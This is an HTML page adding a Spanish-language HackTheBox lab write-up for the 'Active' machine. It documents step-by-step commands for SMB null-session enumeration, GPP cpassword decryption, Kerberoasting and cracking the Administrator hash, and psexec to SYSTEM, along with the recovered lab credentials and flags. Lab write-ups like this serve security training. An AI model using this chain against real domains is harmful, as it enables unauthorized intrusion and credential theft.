@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Active HTB &mdash; Kerberoasting | OJM.SEC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f7f6f2; --surface: #ffffff; --border: #e2e0d8;
+  --text: #1a1917; --muted: #7a7870; --accent: #c8441b; --accent2: #1b5ec8;
+  --tag-bg: #f0ede4; --mono: 'JetBrains Mono', monospace; --sans: 'Syne', sans-serif;
+}
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
+}
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
+.nav-writeup-nav { display: flex; gap: 0.5rem; }
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
+.stat { display: flex; flex-direction: column; gap: 0.2rem; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+.sidebar { position: sticky; top: 76px; align-self: start; }
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+.sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
+.writeup-content { min-width: 0; }
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
+.section:last-child { border-bottom: none; }
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
+.section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
+.cmd-comment { color: #6b7280; }
+.cmd-flag { color: #60a5fa; }
+.cmd-value { color: #34d399; }
+.cmd-tool { color: #f87171; }
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
+.sev-critical { background: #fee2e2; color: #7f1d1d; }
+.sev-high { background: #fee2e2; color: #991b1b; }
+.sev-medium { background: #fef3c7; color: #92400e; }
+.sev-info { background: #e0f2fe; color: #0c4a6e; }
+.tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
+.cred-label { color: #6b7280; }
+.cred-user { color: #60a5fa; }
+.cred-pass { color: #34d399; }
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
+</style>
+</head><body>
+<nav>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
+  <div class="nav-links">
+    <a href="index.html">&larr; Volver</a>
+    <div class="nav-writeup-nav">
+      <a class="nav-btn prev" href="escape.html">&larr; Escape</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
+      <a class="nav-btn next" href="checkpoint.html">Checkpoint &rarr;</a>
+    </div>
+  </div>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-meta">
+    <span class="platform-badge htb">HackTheBox</span>
+    <span class="difficulty-badge">Active Directory</span>
+    <span class="difficulty-badge">Windows Server 2008 R2</span>
+    <span class="difficulty-badge">18 Jun 2026</span>
+  </div>
+  <h1>Active</h1>
+  <p class="subtitle">active.htb &mdash; Domain Admin via GPP Password + Kerberoasting Administrator</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.17.241</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">active.htb</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2008 R2 SP1</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">4 (1 Critical, 2 High, 1 Info)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">NT AUTHORITY\SYSTEM</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <nav class="sidebar-nav">
+      <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
+      <a class="sidebar-link" href="#nmap">01 &middot; Nmap</a>
+      <a class="sidebar-link" href="#smb">02 &middot; SMB null session</a>
+      <a class="sidebar-link" href="#gpp">03 &middot; GPP Password</a>
+      <a class="sidebar-link" href="#kerb">04 &middot; Kerberoasting</a>
+      <a class="sidebar-link" href="#root">05 &middot; psexec SYSTEM</a>
+      <a class="sidebar-link" href="#findings">Findings</a>
+      <a class="sidebar-link" href="#creds">Credenciales</a>
+    </nav>
+  </aside>
+  <main class="writeup-content">
+    <section class="section" id="resumen">
+      <div class="section-label">00 &mdash; Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Active es una m&aacute;quina cl&aacute;sica de HackTheBox que ilustra dos vectores hist&oacute;ricos pero todav&iacute;a relevantes en auditor&iacute;as AD: las <strong>GPP Passwords</strong> (Group Policy Preferences), vulnerabilidad conocida desde 2014 (MS14-025), y el <strong>Kerberoasting</strong> del account Administrator.</p>
+      <p>La gracia de esta m&aacute;quina es la limpieza de la cadena: desde cero credenciales hasta SYSTEM en cuatro pasos sin exploits, solo abuso de configuraciones y protocolos AD.</p>
+      <div class="callout"><strong>Attack Path</strong><br>SMB null session &rarr; Replication share &rarr; Groups.xml GPP cpassword &rarr; gpp-decrypt &rarr; SVC_TGS creds &rarr; Kerberoasting Administrator &rarr; hashcat TGS-REP &rarr; Ticketmaster1968 &rarr; impacket-psexec &rarr; SYSTEM</div>
+    </section>
+    <section class="section" id="nmap">
+      <div class="section-label">01 &mdash; Recon</div>
+      <h2>Nmap &mdash; DC antiguo, Windows Server 2008 R2</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01</div>
+        <div class="step-title">OS antiguo &mdash; mayor superficie de ataque potencial</div>
+        <p class="step-desc">El DNS fingerprint revela <code>Microsoft DNS 6.1.7601</code>, correspondiente a Windows Server 2008 R2 SP1. Un sistema operativo EOL con una superficie de ataque hist&oacute;ricamente amplia. No hay MSSQL ni WinRM, el vector principal es SMB.</p>
+        <pre>53/tcp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp  open  kerberos-sec
+389/tcp open  ldap    active.htb
+445/tcp open  microsoft-ds
+<span class="cmd-comment"># Sin WinRM (5985) ni MSSQL &mdash; foco en SMB + Kerberos</span></pre>
+      </div>
+    </section>
+    <section class="section" id="smb">
+      <div class="section-label">02 &mdash; SMB</div>
+      <h2>Null session &mdash; Share Replication accesible</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 02</div>
+        <div class="step-title">Sesion nula &rarr; Replication share &rarr; volcado recursivo de SYSVOL</div>
+        <p class="step-desc">La sesi&oacute;n nula (usuario vac&iacute;o, sin contrase&ntilde;a) permite listar shares. El share <code>Replication</code> contiene una c&oacute;pia del SYSVOL del dominio. Se descarga todo el contenido recursivamente para an&aacute;lisis offline.</p>
+        <pre><span class="cmd-tool">nxc</span> smb 10.129.17.241 <span class="cmd-flag">-u</span> '' <span class="cmd-flag">-p</span> '' --shares
+<span class="cmd-value">Replication   READ</span>
+
+<span class="cmd-tool">smbclient</span> //active.htb/Replication <span class="cmd-flag">-N</span> -c "recurse; prompt; mget *"
+<span class="cmd-comment"># Descarga Groups.xml, Registry.pol, GPT.INI y GptTmpl.inf</span></pre>
+      </div>
+    </section>
+    <section class="section" id="gpp">
+      <div class="section-label">03 &mdash; GPP Password</div>
+      <h2>Groups.xml &mdash; cpassword cifrada con AES-256 (clave p&uacute;blica de Microsoft)</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 03</div>
+        <div class="step-title">Groups.xml revela cpassword de SVC_TGS &mdash; gpp-decrypt la descifra</div>
+        <p class="step-desc">El archivo <code>Groups.xml</code> dentro de la GPO contiene el campo <code>cpassword</code>, que es la contrase&ntilde;a cifrada con AES-256 usando una clave que Microsoft public&oacute; en 2012 en su documentaci&oacute;n MSDN. Desde entonces cualquier atacante puede descifrarla. La herramienta <code>gpp-decrypt</code> lo hace autom&aacute;ticamente.</p>
+        <pre><span class="cmd-comment"># Groups.xml encontrado en Policies/{GPO-UUID}/MACHINE/Preferences/Groups/</span>
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLf..."
+userName="active.htb\SVC_TGS"
+
+<span class="cmd-tool">gpp-decrypt</span> "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLf..."
+<span class="cmd-value">GPPstillStandingStrong2k18</span></pre>
+      </div>
+    </section>
+    <section class="section" id="kerb">
+      <div class="section-label">04 &mdash; Kerberoasting</div>
+      <h2>GetUserSPNs &mdash; TGS-REP del Administrator &rarr; hashcat</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 04</div>
+        <div class="step-title">SVC_TGS puede pedir TGS para Administrator (SPN activo) &rarr; TGS-REP crackeable</div>
+        <p class="step-desc">Con las credenciales de SVC_TGS, pedimos los SPNs del dominio. El Administrator tiene un SPN <code>active/CIFS:445</code>, lo que lo hace Kerberoasteable: cualquier usuario del dominio puede solicitar su TGS-REP y crackearlo offline sin alertar al DC.</p>
+        <pre><span class="cmd-tool">impacket-GetUserSPNs</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="cmd-flag">-dc-ip</span> 10.129.17.241
+<span class="cmd-value">active/CIFS:445   Administrator</span>
+
+<span class="cmd-tool">impacket-GetUserSPNs</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="cmd-flag">-dc-ip</span> 10.129.17.241 <span class="cmd-flag">-request-user</span> Administrator
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e39da0a9...
+
+<span class="cmd-tool">hashcat</span> Administrator_hash.txt /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$*Administrator$...: <span class="cmd-value">Ticketmaster1968</span></pre>
+      </div>
+    </section>
+    <section class="section" id="root">
+      <div class="section-label">05 &mdash; Root</div>
+      <h2>impacket-psexec &rarr; NT AUTHORITY\SYSTEM</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 05</div>
+        <div class="step-title">Sin WinRM disponible &mdash; psexec v&iacute;a SMB con Administrator</div>
+        <p class="step-desc">Al no haber WinRM activo, usamos <code>impacket-psexec</code> que sube un ejecutable temporal al share ADMIN$ y crea un servicio para obtener shell. El acceso se consigue directamente como SYSTEM, sin necesidad de escalar desde Administrator.</p>
+        <pre><span class="cmd-tool">nxc</span> smb 10.129.17.241 <span class="cmd-flag">-u</span> Administrator <span class="cmd-flag">-p</span> Ticketmaster1968
+<span class="cmd-value">[+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span>
+
+<span class="cmd-tool">impacket-psexec</span> active.htb/Administrator:'Ticketmaster1968'@10.129.17.241
+Microsoft Windows [Version 6.1.7601]
+C:\Windows\system32> whoami
+<span class="cmd-value">nt authority\system</span>
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+<span class="cmd-value">46fa441a47d4a32caac5e0cccdb72fd8</span></pre>
+      </div>
+    </section>
+    <section class="section" id="findings">
+      <div class="section-label">06 &mdash; Findings</div>
+      <h2>Tabla de Hallazgos</h2>
+      <table class="findings-table">
+        <thead><tr><th>Severity</th><th>Finding</th><th>Descripci&oacute;n</th><th>CVSS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="severity sev-critical">Critical</span></td><td>GPP Password &mdash; MS14-025</td><td>cpassword en Groups.xml descifrable por cualquier usuario. Clave AES publicada por Microsoft en 2012.</td><td>9.0</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Kerberoasting del Administrator</td><td>SPN activo en la cuenta Administrator permite solicitar TGS-REP crackeable offline.</td><td>8.1</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Contrase&ntilde;a d&eacute;bil Administrator</td><td>Ticketmaster1968 crackeada con rockyou.txt. Pol&iacute;tica de contrase&ntilde;as insuficiente.</td><td>7.5</td></tr>
+          <tr><td><span class="severity sev-info">Info</span></td><td>SMB null session activo</td><td>Permite enumerar shares sin credenciales. Exposici&oacute;n de estructura SYSVOL.</td><td>3.1</td></tr>
+        </tbody>
+      </table>
+      <div class="tag-row"><span class="tag">GPP Passwords</span><span class="tag">MS14-025</span><span class="tag">Kerberoasting</span><span class="tag">TGS-REP</span><span class="tag">hashcat</span><span class="tag">impacket-psexec</span></div>
+    </section>
+    <section class="section" id="creds">
+      <div class="section-label">07 &mdash; Credentials</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box"><span class="cred-label"># GPP decrypt (Groups.xml)</span>
+<span class="cred-user">active.htb\SVC_TGS</span>:<span class="cred-pass">GPPstillStandingStrong2k18</span>
+<span class="cred-label"># Administrator (Kerberoasting TGS-REP cracked)</span>
+<span class="cred-user">active.htb\Administrator</span>:<span class="cred-pass">Ticketmaster1968</span></div>
+      <div class="callout"><strong>Flags</strong><br>user.txt: 62c7c0bb09a76aa924fb16f6f6e71450<br>root.txt: 46fa441a47d4a32caac5e0cccdb72fd8</div>
+    </section>
+  </main>
+</div>
+<footer>OJM.SEC &middot; Oriol Jaen Mirabet &middot; Security Research &amp; Writeups</footer>
+</body>
+</html>
